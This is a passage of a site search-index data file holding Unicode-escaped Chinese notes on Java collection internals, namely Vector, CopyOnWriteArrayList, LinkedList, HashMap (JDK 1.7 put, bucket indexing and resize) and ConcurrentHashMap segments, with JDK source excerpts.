\u5728\u8FDB\u884C\u5E8F\u5217\u5316\u6216\u8005\u8FED\u4EE3\u7B49\u64CD\u4F5C\u65F6\uFF0C\u9700\u8981\u6BD4\u8F83\u64CD\u4F5C\u524D\u540E modCount \u662F\u5426\u6539\u53D8\uFF0C\u5982\u679C\u6539\u53D8\u4E86\u9700\u8981\u629B\u51FA ConcurrentModificationException\u3002\u4EE3\u7801\u53C2\u8003\u4E0A\u8282\u5E8F\u5217\u5316\u4E2D\u7684 writeObject() \u65B9\u6CD5\u3002`},{header:"Vector",slug:"vector",content:""},{header:"1. \u540C\u6B65",slug:"_1-\u540C\u6B65",content:`\u5B83\u7684\u5B9E\u73B0\u4E0E ArrayList \u7C7B\u4F3C\uFF0C\u4F46\u662F\u4F7F\u7528\u4E86 synchronized \u8FDB\u884C\u540C\u6B65\u3002
public synchronized boolean add(E e) { modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;
} public synchronized E get(int index) { if (index >= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);
}`},{header:"2. \u6269\u5BB9",slug:"_2-\u6269\u5BB9-1",content:`Vector \u7684\u6784\u9020\u51FD\u6570\u53EF\u4EE5\u4F20\u5165 capacityIncrement \u53C2\u6570\uFF0C\u5B83\u7684\u4F5C\u7528\u662F\u5728\u6269\u5BB9\u65F6\u4F7F\u5BB9\u91CF capacity \u589E\u957F capacityIncrement\u3002\u5982\u679C\u8FD9\u4E2A\u53C2\u6570\u7684\u503C\u5C0F\u4E8E\u7B49\u4E8E 0\uFF0C\u6269\u5BB9\u65F6\u6BCF\u6B21\u90FD\u4EE4 capacity \u4E3A\u539F\u6765\u7684\u4E24\u500D\u3002
public Vector(int initialCapacity, int capacityIncrement) { super(); if (initialCapacity < 0) throw new IllegalArgumentException("Illegal Capacity: "+ initialCapacity); this.elementData = new Object[initialCapacity]; this.capacityIncrement = capacityIncrement;
}
private void grow(int minCapacity) { // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + ((capacityIncrement > 0) ? capacityIncrement : oldCapacity); if (newCapacity - minCapacity < 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE > 0) newCapacity = hugeCapacity(minCapacity); elementData = Arrays.copyOf(elementData, newCapacity);
}
\u8C03\u7528\u6CA1\u6709 capacityIncrement \u7684\u6784\u9020\u51FD\u6570\u65F6\uFF0CcapacityIncrement \u503C\u88AB\u8BBE\u7F6E\u4E3A 0\uFF0C\u4E5F\u5C31\u662F\u8BF4\u9ED8\u8BA4\u60C5\u51B5\u4E0B Vector \u6BCF\u6B21\u6269\u5BB9\u65F6\u5BB9\u91CF\u90FD\u4F1A\u7FFB\u500D\u3002
public Vector(int initialCapacity) { this(initialCapacity, 0);
} public Vector() { this(10);
}`},{header:"3. \u4E0E ArrayList \u7684\u6BD4\u8F83",slug:"_3-\u4E0E-arraylist-\u7684\u6BD4\u8F83",content:`Vector \u662F\u540C\u6B65\u7684\uFF0C\u56E0\u6B64\u5F00\u9500\u5C31\u6BD4 ArrayList \u8981\u5927\uFF0C\u8BBF\u95EE\u901F\u5EA6\u66F4\u6162\u3002\u6700\u597D\u4F7F\u7528 ArrayList \u800C\u4E0D\u662F Vector\uFF0C\u56E0\u4E3A\u540C\u6B65\u64CD\u4F5C\u5B8C\u5168\u53EF\u4EE5\u7531\u7A0B\u5E8F\u5458\u81EA\u5DF1\u6765\u63A7\u5236\uFF1B
Vector \u6BCF\u6B21\u6269\u5BB9\u8BF7\u6C42\u5176\u5927\u5C0F\u7684 2 \u500D\uFF08\u4E5F\u53EF\u4EE5\u901A\u8FC7\u6784\u9020\u51FD\u6570\u8BBE\u7F6E\u589E\u957F\u7684\u5BB9\u91CF\uFF09\uFF0C\u800C ArrayList \u662F 1.5 \u500D\u3002`},{header:"4. \u66FF\u4EE3\u65B9\u6848",slug:"_4-\u66FF\u4EE3\u65B9\u6848",content:`\u53EF\u4EE5\u4F7F\u7528 Collections.synchronizedList(); \u5F97\u5230\u4E00\u4E2A\u7EBF\u7A0B\u5B89\u5168\u7684 ArrayList\u3002
List<String> list = new ArrayList<>();
List<String> synList = Collections.synchronizedList(list);
\u4E5F\u53EF\u4EE5\u4F7F\u7528 concurrent \u5E76\u53D1\u5305\u4E0B\u7684 CopyOnWriteArrayList \u7C7B\u3002
List<String> list = new CopyOnWriteArrayList<>();`},{header:"CopyOnWriteArrayList",slug:"copyonwritearraylist",content:""},{header:"1. \u8BFB\u5199\u5206\u79BB",slug:"_1-\u8BFB\u5199\u5206\u79BB",content:`\u5199\u64CD\u4F5C\u5728\u4E00\u4E2A\u590D\u5236\u7684\u6570\u7EC4\u4E0A\u8FDB\u884C\uFF0C\u8BFB\u64CD\u4F5C\u8FD8\u662F\u5728\u539F\u59CB\u6570\u7EC4\u4E2D\u8FDB\u884C\uFF0C\u8BFB\u5199\u5206\u79BB\uFF0C\u4E92\u4E0D\u5F71\u54CD\u3002
\u5199\u64CD\u4F5C\u9700\u8981\u52A0\u9501\uFF0C\u9632\u6B62\u5E76\u53D1\u5199\u5165\u65F6\u5BFC\u81F4\u5199\u5165\u6570\u636E\u4E22\u5931\u3002
\u5199\u64CD\u4F5C\u7ED3\u675F\u4E4B\u540E\u9700\u8981\u628A\u539F\u59CB\u6570\u7EC4\u6307\u5411\u65B0\u7684\u590D\u5236\u6570\u7EC4\u3002
public boolean add(E e) { final ReentrantLock lock = this.lock; lock.lock(); try { Object[] elements = getArray(); int len = elements.length; Object[] newElements = Arrays.copyOf(elements, len + 1); newElements[len] = e; setArray(newElements); return true; } finally { lock.unlock(); }
} final void setArray(Object[] a) { array = a;
}
@SuppressWarnings("unchecked")
private E get(Object[] a, int index) { return (E) a[index];
}`},{header:"2. \u9002\u7528\u573A\u666F",slug:"_2-\u9002\u7528\u573A\u666F",content:`CopyOnWriteArrayList \u5728\u5199\u64CD\u4F5C\u7684\u540C\u65F6\u5141\u8BB8\u8BFB\u64CD\u4F5C\uFF0C\u5927\u5927\u63D0\u9AD8\u4E86\u8BFB\u64CD\u4F5C\u7684\u6027\u80FD\uFF0C\u56E0\u6B64\u5F88\u9002\u5408\u8BFB\u591A\u5199\u5C11\u7684\u5E94\u7528\u573A\u666F\u3002
\u4F46\u662F CopyOnWriteArrayList \u6709\u5176\u7F3A\u9677\uFF1A \u5185\u5B58\u5360\u7528\uFF1A\u5728\u5199\u64CD\u4F5C\u65F6\u9700\u8981\u590D\u5236\u4E00\u4E2A\u65B0\u7684\u6570\u7EC4\uFF0C\u4F7F\u5F97\u5185\u5B58\u5360\u7528\u4E3A\u539F\u6765\u7684\u4E24\u500D\u5DE6\u53F3\uFF1B
\u6570\u636E\u4E0D\u4E00\u81F4\uFF1A\u8BFB\u64CD\u4F5C\u4E0D\u80FD\u8BFB\u53D6\u5B9E\u65F6\u6027\u7684\u6570\u636E\uFF0C\u56E0\u4E3A\u90E8\u5206\u5199\u64CD\u4F5C\u7684\u6570\u636E\u8FD8\u672A\u540C\u6B65\u5230\u8BFB\u6570\u7EC4\u4E2D\u3002 \u6240\u4EE5 CopyOnWriteArrayList \u4E0D\u9002\u5408\u5185\u5B58\u654F\u611F\u4EE5\u53CA\u5BF9\u5B9E\u65F6\u6027\u8981\u6C42\u5F88\u9AD8\u7684\u573A\u666F\u3002`},{header:"LinkedList",slug:"linkedlist",content:""},{header:"1. \u6982\u89C8",slug:"_1-\u6982\u89C8-1",content:`\u57FA\u4E8E\u53CC\u5411\u94FE\u8868\u5B9E\u73B0\uFF0C\u4F7F\u7528 Node \u5B58\u50A8\u94FE\u8868\u8282\u70B9\u4FE1\u606F\u3002
private static class Node<E> { E item; Node<E> next; Node<E> prev;
}
\u6BCF\u4E2A\u94FE\u8868\u5B58\u50A8\u4E86 first \u548C last \u6307\u9488\uFF1A
transient Node<E> first;
transient Node<E> last;`},{header:"2. \u4E0E ArrayList \u7684\u6BD4\u8F83",slug:"_2-\u4E0E-arraylist-\u7684\u6BD4\u8F83",content:`ArrayList \u57FA\u4E8E\u52A8\u6001\u6570\u7EC4\u5B9E\u73B0\uFF0CLinkedList \u57FA\u4E8E\u53CC\u5411\u94FE\u8868\u5B9E\u73B0\u3002ArrayList \u548C LinkedList \u7684\u533A\u522B\u53EF\u4EE5\u5F52\u7ED3\u4E3A\u6570\u7EC4\u548C\u94FE\u8868\u7684\u533A\u522B\uFF1A \u6570\u7EC4\u652F\u6301\u968F\u673A\u8BBF\u95EE\uFF0C\u4F46\u63D2\u5165\u5220\u9664\u7684\u4EE3\u4EF7\u5F88\u9AD8\uFF0C\u9700\u8981\u79FB\u52A8\u5927\u91CF\u5143\u7D20\uFF1B
\u94FE\u8868\u4E0D\u652F\u6301\u968F\u673A\u8BBF\u95EE\uFF0C\u4F46\u63D2\u5165\u5220\u9664\u53EA\u9700\u8981\u6539\u53D8\u6307\u9488\u3002`},{header:"HashMap",slug:"hashmap",content:"\u4E3A\u4E86\u4FBF\u4E8E\u7406\u89E3\uFF0C\u4EE5\u4E0B\u6E90\u7801\u5206\u6790\u4EE5 JDK 1.7 \u4E3A\u4E3B\u3002"},{header:"1. \u5B58\u50A8\u7ED3\u6784",slug:"_1-\u5B58\u50A8\u7ED3\u6784",content:`\u5185\u90E8\u5305\u542B\u4E86\u4E00\u4E2A Entry \u7C7B\u578B\u7684\u6570\u7EC4 table\u3002Entry \u5B58\u50A8\u7740\u952E\u503C\u5BF9\u3002\u5B83\u5305\u542B\u4E86\u56DB\u4E2A\u5B57\u6BB5\uFF0C\u4ECE next \u5B57\u6BB5\u6211\u4EEC\u53EF\u4EE5\u770B\u51FA Entry \u662F\u4E00\u4E2A\u94FE\u8868\u3002\u5373\u6570\u7EC4\u4E2D\u7684\u6BCF\u4E2A\u4F4D\u7F6E\u88AB\u5F53\u6210\u4E00\u4E2A\u6876\uFF0C\u4E00\u4E2A\u6876\u5B58\u653E\u4E00\u4E2A\u94FE\u8868\u3002HashMap \u4F7F\u7528\u62C9\u94FE\u6CD5\u6765\u89E3\u51B3\u51B2\u7A81\uFF0C\u540C\u4E00\u4E2A\u94FE\u8868\u4E2D\u5B58\u653E\u54C8\u5E0C\u503C\u548C\u6563\u5217\u6876\u53D6\u6A21\u8FD0\u7B97\u7ED3\u679C\u76F8\u540C\u7684 Entry\u3002 transient Entry[] table;
static class Entry<K,V> implements Map.Entry<K,V> { final K key; V value; Entry<K,V> next; int hash; Entry(int h, K k, V v, Entry<K,V> n) { value = v; next = n; key = k; hash = h; } public final K getKey() { return key; } public final V getValue() { return value; } public final V setValue(V newValue) { V oldValue = value; value = newValue; return oldValue; } public final boolean equals(Object o) { if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null && k1.equals(k2))) { Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null && v1.equals(v2))) return true; } return false; } public final int hashCode() { return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); } public final String toString() { return getKey() + "=" + getValue(); }
}`},{header:"2. \u62C9\u94FE\u6CD5\u7684\u5DE5\u4F5C\u539F\u7406",slug:"_2-\u62C9\u94FE\u6CD5\u7684\u5DE5\u4F5C\u539F\u7406",content:`HashMap<String, String> map = new HashMap<>();
map.put("K1", "V1");
map.put("K2", "V2");
map.put("K3", "V3"); \u65B0\u5EFA\u4E00\u4E2A HashMap\uFF0C\u9ED8\u8BA4\u5927\u5C0F\u4E3A 16\uFF1B
\u63D2\u5165 <K1,V1> \u952E\u503C\u5BF9\uFF0C\u5148\u8BA1\u7B97 K1 \u7684 hashCode \u4E3A 115\uFF0C\u4F7F\u7528\u9664\u7559\u4F59\u6570\u6CD5\u5F97\u5230\u6240\u5728\u7684\u6876\u4E0B\u6807 115%16=3\u3002
\u63D2\u5165 <K2,V2> \u952E\u503C\u5BF9\uFF0C\u5148\u8BA1\u7B97 K2 \u7684 hashCode \u4E3A 118\uFF0C\u4F7F\u7528\u9664\u7559\u4F59\u6570\u6CD5\u5F97\u5230\u6240\u5728\u7684\u6876\u4E0B\u6807 118%16=6\u3002
\u63D2\u5165 <K3,V3> \u952E\u503C\u5BF9\uFF0C\u5148\u8BA1\u7B97 K3 \u7684 hashCode \u4E3A 118\uFF0C\u4F7F\u7528\u9664\u7559\u4F59\u6570\u6CD5\u5F97\u5230\u6240\u5728\u7684\u6876\u4E0B\u6807 118%16=6\uFF0C\u63D2\u5728 <K2,V2> \u524D\u9762\u3002 \u5E94\u8BE5\u6CE8\u610F\u5230\u94FE\u8868\u7684\u63D2\u5165\u662F\u4EE5\u5934\u63D2\u6CD5\u65B9\u5F0F\u8FDB\u884C\u7684\uFF0C\u4F8B\u5982\u4E0A\u9762\u7684 <K3,V3> \u4E0D\u662F\u63D2\u5728 <K2,V2> \u540E\u9762\uFF0C\u800C\u662F\u63D2\u5165\u5728\u94FE\u8868\u5934\u90E8\u3002
\u67E5\u627E\u9700\u8981\u5206\u6210\u4E24\u6B65\u8FDB\u884C\uFF1A \u8BA1\u7B97\u952E\u503C\u5BF9\u6240\u5728\u7684\u6876\uFF1B
\u5728\u94FE\u8868\u4E0A\u987A\u5E8F\u67E5\u627E\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\u663E\u7136\u548C\u94FE\u8868\u7684\u957F\u5EA6\u6210\u6B63\u6BD4\u3002`},{header:"3. put \u64CD\u4F5C",slug:"_3-put-\u64CD\u4F5C",content:`public V put(K key, V value) { if (table == EMPTY_TABLE) { inflateTable(threshold); } // \u952E\u4E3A null \u5355\u72EC\u5904\u7406 if (key == null) return putForNullKey(value); int hash = hash(key); // \u786E\u5B9A\u6876\u4E0B\u6807 int i = indexFor(hash, table.length); // \u5148\u627E\u51FA\u662F\u5426\u5DF2\u7ECF\u5B58\u5728\u952E\u4E3A key \u7684\u952E\u503C\u5BF9\uFF0C\u5982\u679C\u5B58\u5728\u7684\u8BDD\u5C31\u66F4\u65B0\u8FD9\u4E2A\u952E\u503C\u5BF9\u7684\u503C\u4E3A value for (Entry<K,V> e = table[i]; e != null; e = e.next) { Object k; if (e.hash == hash && ((k = e.key) == key || key.equals(k))) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; // \u63D2\u5165\u65B0\u952E\u503C\u5BF9 addEntry(hash, key, value, i); return null;
}
HashMap \u5141\u8BB8\u63D2\u5165\u952E\u4E3A null \u7684\u952E\u503C\u5BF9\u3002\u4F46\u662F\u56E0\u4E3A\u65E0\u6CD5\u8C03\u7528 null \u7684 hashCode() \u65B9\u6CD5\uFF0C\u4E5F\u5C31\u65E0\u6CD5\u786E\u5B9A\u8BE5\u952E\u503C\u5BF9\u7684\u6876\u4E0B\u6807\uFF0C\u53EA\u80FD\u901A\u8FC7\u5F3A\u5236\u6307\u5B9A\u4E00\u4E2A\u6876\u4E0B\u6807\u6765\u5B58\u653E\u3002HashMap \u4F7F\u7528\u7B2C 0 \u4E2A\u6876\u5B58\u653E\u952E\u4E3A null \u7684\u952E\u503C\u5BF9\u3002
private V putForNullKey(V value) { for (Entry<K,V> e = table[0]; e != null; e = e.next) { if (e.key == null) { V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; } } modCount++; addEntry(0, null, value, 0); return null;
}
\u4F7F\u7528\u94FE\u8868\u7684\u5934\u63D2\u6CD5\uFF0C\u4E5F\u5C31\u662F\u65B0\u7684\u952E\u503C\u5BF9\u63D2\u5728\u94FE\u8868\u7684\u5934\u90E8\uFF0C\u800C\u4E0D\u662F\u94FE\u8868\u7684\u5C3E\u90E8\u3002
void addEntry(int hash, K key, V value, int bucketIndex) { if ((size >= threshold) && (null != table[bucketIndex])) { resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); } createEntry(hash, key, value, bucketIndex);
} void createEntry(int hash, K key, V value, int bucketIndex) { Entry<K,V> e = table[bucketIndex]; // \u5934\u63D2\u6CD5\uFF0C\u94FE\u8868\u5934\u90E8\u6307\u5411\u65B0\u7684\u952E\u503C\u5BF9 table[bucketIndex] = new Entry<>(hash, key, value, e); size++;
}
Entry(int h, K k, V v, Entry<K,V> n) { value = v; next = n; key = k; hash = h;
}`},{header:"4. \u786E\u5B9A\u6876\u4E0B\u6807",slug:"_4-\u786E\u5B9A\u6876\u4E0B\u6807",content:`\u5F88\u591A\u64CD\u4F5C\u90FD\u9700\u8981\u5148\u786E\u5B9A\u4E00\u4E2A\u952E\u503C\u5BF9\u6240\u5728\u7684\u6876\u4E0B\u6807\u3002
int hash = hash(key);
int i = indexFor(hash, table.length);
4.1 \u8BA1\u7B97 hash \u503C
final int hash(Object k) { int h = hashSeed; if (0 != h && k instanceof String) { return sun.misc.Hashing.stringHash32((String) k); } h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h >>> 20) ^ (h >>> 12); return h ^ (h >>> 7) ^ (h >>> 4);
}
public final int hashCode() { return Objects.hashCode(key) ^ Objects.hashCode(value);
}
4.2 \u53D6\u6A21
\u4EE4 x = 1<<4\uFF0C\u5373 x \u4E3A 2 \u7684 4 \u6B21\u65B9\uFF0C\u5B83\u5177\u6709\u4EE5\u4E0B\u6027\u8D28\uFF1A
x : 00010000
x-1 : 00001111
\u4EE4\u4E00\u4E2A\u6570 y \u4E0E x-1 \u505A\u4E0E\u8FD0\u7B97\uFF0C\u53EF\u4EE5\u53BB\u9664 y \u4F4D\u7EA7\u8868\u793A\u7684\u7B2C 4 \u4F4D\u4EE5\u4E0A\u6570\uFF1A
y : 10110010
x-1 : 00001111
y&(x-1) : 00000010
\u8FD9\u4E2A\u6027\u8D28\u548C y \u5BF9 x \u53D6\u6A21\u6548\u679C\u662F\u4E00\u6837\u7684\uFF1A
y : 10110010
x : 00010000
y%x : 00000010
\u6211\u4EEC\u77E5\u9053\uFF0C\u4F4D\u8FD0\u7B97\u7684\u4EE3\u4EF7\u6BD4\u6C42\u6A21\u8FD0\u7B97\u5C0F\u7684\u591A\uFF0C\u56E0\u6B64\u5728\u8FDB\u884C\u8FD9\u79CD\u8BA1\u7B97\u65F6\u7528\u4F4D\u8FD0\u7B97\u7684\u8BDD\u80FD\u5E26\u6765\u66F4\u9AD8\u7684\u6027\u80FD\u3002
\u786E\u5B9A\u6876\u4E0B\u6807\u7684\u6700\u540E\u4E00\u6B65\u662F\u5C06 key \u7684 hash \u503C\u5BF9\u6876\u4E2A\u6570\u53D6\u6A21\uFF1Ahash%capacity\uFF0C\u5982\u679C\u80FD\u4FDD\u8BC1 capacity \u4E3A 2 \u7684 n \u6B21\u65B9\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u5C06\u8FD9\u4E2A\u64CD\u4F5C\u8F6C\u6362\u4E3A\u4F4D\u8FD0\u7B97\u3002
static int indexFor(int h, int length) { return h & (length-1);
}`},{header:"5. \u6269\u5BB9-\u57FA\u672C\u539F\u7406",slug:"_5-\u6269\u5BB9-\u57FA\u672C\u539F\u7406",content:`\u8BBE HashMap \u7684 table \u957F\u5EA6\u4E3A M\uFF0C\u9700\u8981\u5B58\u50A8\u7684\u952E\u503C\u5BF9\u6570\u91CF\u4E3A N\uFF0C\u5982\u679C\u54C8\u5E0C\u51FD\u6570\u6EE1\u8DB3\u5747\u5300\u6027\u7684\u8981\u6C42\uFF0C\u90A3\u4E48\u6BCF\u6761\u94FE\u8868\u7684\u957F\u5EA6\u5927\u7EA6\u4E3A N/M\uFF0C\u56E0\u6B64\u67E5\u627E\u7684\u590D\u6742\u5EA6\u4E3A O(N/M)\u3002
\u4E3A\u4E86\u8BA9\u67E5\u627E\u7684\u6210\u672C\u964D\u4F4E\uFF0C\u5E94\u8BE5\u4F7F N/M \u5C3D\u53EF\u80FD\u5C0F\uFF0C\u56E0\u6B64\u9700\u8981\u4FDD\u8BC1 M \u5C3D\u53EF\u80FD\u5927\uFF0C\u4E5F\u5C31\u662F\u8BF4 table \u8981\u5C3D\u53EF\u80FD\u5927\u3002HashMap \u91C7\u7528\u52A8\u6001\u6269\u5BB9\u6765\u6839\u636E\u5F53\u524D\u7684 N \u503C\u6765\u8C03\u6574 M \u503C\uFF0C\u4F7F\u5F97\u7A7A\u95F4\u6548\u7387\u548C\u65F6\u95F4\u6548\u7387\u90FD\u80FD\u5F97\u5230\u4FDD\u8BC1\u3002
\u548C\u6269\u5BB9\u76F8\u5173\u7684\u53C2\u6570\u4E3B\u8981\u6709\uFF1Acapacity\u3001size\u3001threshold \u548C load_factor\u3002 \u53C2\u6570
\u542B\u4E49 capacity
table \u7684\u5BB9\u91CF\u5927\u5C0F\uFF0C\u9ED8\u8BA4\u4E3A 16\u3002\u9700\u8981\u6CE8\u610F\u7684\u662F capacity \u5FC5\u987B\u4FDD\u8BC1\u4E3A 2 \u7684 n \u6B21\u65B9\u3002 size
\u952E\u503C\u5BF9\u6570\u91CF\u3002 threshold
size \u7684\u4E34\u754C\u503C\uFF0C\u5F53 size \u5927\u4E8E\u7B49\u4E8E threshold \u5C31\u5FC5\u987B\u8FDB\u884C\u6269\u5BB9\u64CD\u4F5C\u3002 loadFactor
\u88C5\u8F7D\u56E0\u5B50\uFF0Ctable \u80FD\u591F\u4F7F\u7528\u7684\u6BD4\u4F8B\uFF0Cthreshold = (int)(capacity* loadFactor)\u3002 static final int DEFAULT_INITIAL_CAPACITY = 16; static final int MAXIMUM_CAPACITY = 1 << 30; static final float DEFAULT_LOAD_FACTOR = 0.75f; transient Entry[] table; transient int size; int threshold; final float loadFactor; transient int modCount;
\u4ECE\u4E0B\u9762\u7684\u6DFB\u52A0\u5143\u7D20\u4EE3\u7801\u4E2D\u53EF\u4EE5\u770B\u51FA\uFF0C\u5F53\u9700\u8981\u6269\u5BB9\u65F6\uFF0C\u4EE4 capacity \u4E3A\u539F\u6765\u7684\u4E24\u500D\u3002
void addEntry(int hash, K key, V value, int bucketIndex) { Entry<K,V> e = table[bucketIndex]; table[bucketIndex] = new Entry<>(hash, key, value, e); if (size++ >= threshold) resize(2 * table.length);
}
\u6269\u5BB9\u4F7F\u7528 resize() \u5B9E\u73B0\uFF0C\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF0C\u6269\u5BB9\u64CD\u4F5C\u540C\u6837\u9700\u8981\u628A oldTable \u7684\u6240\u6709\u952E\u503C\u5BF9\u91CD\u65B0\u63D2\u5165 newTable \u4E2D\uFF0C\u56E0\u6B64\u8FD9\u4E00\u6B65\u662F\u5F88\u8D39\u65F6\u7684\u3002
void resize(int newCapacity) { Entry[] oldTable = table; int oldCapacity = oldTable.length; if (oldCapacity == MAXIMUM_CAPACITY) { threshold = Integer.MAX_VALUE; return; } Entry[] newTable = new Entry[newCapacity]; transfer(newTable); table = newTable; threshold = (int)(newCapacity * loadFactor);
} void transfer(Entry[] newTable) { Entry[] src = table; int newCapacity = newTable.length; for (int j = 0; j < src.length; j++) { Entry<K,V> e = src[j]; if (e != null) { src[j] = null; do { Entry<K,V> next = e.next; int i = indexFor(e.hash, newCapacity); e.next = newTable[i]; newTable[i] = e; e = next; } while (e != null); } }
}`},{header:"6. \u6269\u5BB9-\u91CD\u65B0\u8BA1\u7B97\u6876\u4E0B\u6807",slug:"_6-\u6269\u5BB9-\u91CD\u65B0\u8BA1\u7B97\u6876\u4E0B\u6807",content:`\u5728\u8FDB\u884C\u6269\u5BB9\u65F6\uFF0C\u9700\u8981\u628A\u952E\u503C\u5BF9\u91CD\u65B0\u8BA1\u7B97\u6876\u4E0B\u6807\uFF0C\u4ECE\u800C\u653E\u5230\u5BF9\u5E94\u7684\u6876\u4E0A\u3002\u5728\u524D\u9762\u63D0\u5230\uFF0CHashMap \u4F7F\u7528 hash%capacity \u6765\u786E\u5B9A\u6876\u4E0B\u6807\u3002HashMap capacity \u4E3A 2 \u7684 n \u6B21\u65B9\u8FD9\u4E00\u7279\u70B9\u80FD\u591F\u6781\u5927\u964D\u4F4E\u91CD\u65B0\u8BA1\u7B97\u6876\u4E0B\u6807\u64CD\u4F5C\u7684\u590D\u6742\u5EA6\u3002
\u5047\u8BBE\u539F\u6570\u7EC4\u957F\u5EA6 capacity \u4E3A 16\uFF0C\u6269\u5BB9\u4E4B\u540E new capacity \u4E3A 32\uFF1A
capacity : 00010000
new capacity : 00100000
\u5BF9\u4E8E\u4E00\u4E2A Key\uFF0C\u5B83\u7684\u54C8\u5E0C\u503C hash \u5728\u7B2C 5 \u4F4D\uFF1A \u4E3A 0\uFF0C\u90A3\u4E48 hash%00010000 = hash%00100000\uFF0C\u6876\u4F4D\u7F6E\u548C\u539F\u6765\u4E00\u81F4\uFF1B
\u4E3A 1\uFF0Chash%00010000 = hash%00100000 + 16\uFF0C\u6876\u4F4D\u7F6E\u662F\u539F\u4F4D\u7F6E + 16\u3002`},{header:"7. \u8BA1\u7B97\u6570\u7EC4\u5BB9\u91CF",slug:"_7-\u8BA1\u7B97\u6570\u7EC4\u5BB9\u91CF",content:`HashMap \u6784\u9020\u51FD\u6570\u5141\u8BB8\u7528\u6237\u4F20\u5165\u7684\u5BB9\u91CF\u4E0D\u662F 2 \u7684 n \u6B21\u65B9\uFF0C\u56E0\u4E3A\u5B83\u53EF\u4EE5\u81EA\u52A8\u5730\u5C06\u4F20\u5165\u7684\u5BB9\u91CF\u8F6C\u6362\u4E3A 2 \u7684 n \u6B21\u65B9\u3002
\u5148\u8003\u8651\u5982\u4F55\u6C42\u4E00\u4E2A\u6570\u7684\u63A9\u7801\uFF0C\u5BF9\u4E8E 10010000\uFF0C\u5B83\u7684\u63A9\u7801\u4E3A 11111111\uFF0C\u53EF\u4EE5\u4F7F\u7528\u4EE5\u4E0B\u65B9\u6CD5\u5F97\u5230\uFF1A
mask |= mask >> 1 11011000
mask |= mask >> 2 11111110
mask |= mask >> 4 11111111
mask+1 \u662F\u5927\u4E8E\u539F\u59CB\u6570\u5B57\u7684\u6700\u5C0F\u7684 2 \u7684 n \u6B21\u65B9\u3002
num 10010000
mask+1 100000000
\u4EE5\u4E0B\u662F HashMap \u4E2D\u8BA1\u7B97\u6570\u7EC4\u5BB9\u91CF\u7684\u4EE3\u7801\uFF1A
static final int tableSizeFor(int cap) { int n = cap - 1; n |= n >>> 1; n |= n >>> 2; n |= n >>> 4; n |= n >>> 8; n |= n >>> 16; return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;
}`},{header:"8. \u94FE\u8868\u8F6C\u7EA2\u9ED1\u6811",slug:"_8-\u94FE\u8868\u8F6C\u7EA2\u9ED1\u6811",content:"\u4ECE JDK 1.8 \u5F00\u59CB\uFF0C\u4E00\u4E2A\u6876\u5B58\u50A8\u7684\u94FE\u8868\u957F\u5EA6\u5927\u4E8E\u7B49\u4E8E 8 \u65F6\u4F1A\u5C06\u94FE\u8868\u8F6C\u6362\u4E3A\u7EA2\u9ED1\u6811\u3002"},{header:"9. \u4E0E Hashtable \u7684\u6BD4\u8F83",slug:"_9-\u4E0E-hashtable-\u7684\u6BD4\u8F83",content:`Hashtable \u4F7F\u7528 synchronized \u6765\u8FDB\u884C\u540C\u6B65\u3002
HashMap \u53EF\u4EE5\u63D2\u5165\u952E\u4E3A null \u7684 Entry\u3002
HashMap \u7684\u8FED\u4EE3\u5668\u662F fail-fast \u8FED\u4EE3\u5668\u3002
HashMap \u4E0D\u80FD\u4FDD\u8BC1\u968F\u7740\u65F6\u95F4\u7684\u63A8\u79FB Map \u4E2D\u7684\u5143\u7D20\u6B21\u5E8F\u662F\u4E0D\u53D8\u7684\u3002`},{header:"ConcurrentHashMap",slug:"concurrenthashmap",content:""},{header:"1. \u5B58\u50A8\u7ED3\u6784",slug:"_1-\u5B58\u50A8\u7ED3\u6784-1",content:`static final class HashEntry<K,V> { final int hash; final K key; volatile V value; volatile HashEntry<K,V> next;
}
ConcurrentHashMap \u548C HashMap \u5B9E\u73B0\u4E0A\u7C7B\u4F3C\uFF0C\u6700\u4E3B\u8981\u7684\u5DEE\u522B\u662F ConcurrentHashMap \u91C7\u7528\u4E86\u5206\u6BB5\u9501\uFF08Segment\uFF09\uFF0C\u6BCF\u4E2A\u5206\u6BB5\u9501\u7EF4\u62A4\u7740\u51E0\u4E2A\u6876\uFF08HashEntry\uFF09\uFF0C\u591A\u4E2A\u7EBF\u7A0B\u53EF\u4EE5\u540C\u65F6\u8BBF\u95EE\u4E0D\u540C\u5206\u6BB5\u9501\u4E0A\u7684\u6876\uFF0C\u4ECE\u800C\u4F7F\u5176\u5E76\u53D1\u5EA6\u66F4\u9AD8\uFF08\u5E76\u53D1\u5EA6\u5C31\u662F Segment \u7684\u4E2A\u6570\uFF09\u3002
Segment \u7EE7\u627F\u81EA ReentrantLock\u3002
static final class Segment<K,V> extends ReentrantLock implements Serializable { private static final long serialVersionUID = 2249069246763182397L; static final int MAX_SCAN_RETRIES = Runtime.getRuntime().availableProcessors() > 1 ? 64 : 1; transient volatile HashEntry<K,V>[] table; transient int count; transient int modCount; transient int threshold; final float loadFactor;
}
final Segment<K,V>[] segments;
\u9ED8\u8BA4\u7684\u5E76\u53D1\u7EA7\u522B\u4E3A 16\uFF0C\u4E5F\u5C31\u662F\u8BF4\u9ED8\u8BA4\u521B\u5EFA 16 \u4E2A Segment\u3002
static final int DEFAULT_CONCURRENCY_LEVEL = 16;`},{header:"2. size \u64CD\u4F5C",slug:"_2-size-\u64CD\u4F5C",content:`\u6BCF\u4E2A Segment \u7EF4\u62A4\u4E86\u4E00\u4E2A count \u53D8\u91CF\u6765\u7EDF\u8BA1\u8BE5 Segment \u4E2D\u7684\u952E\u503C\u5BF9\u4E2A\u6570\u3002
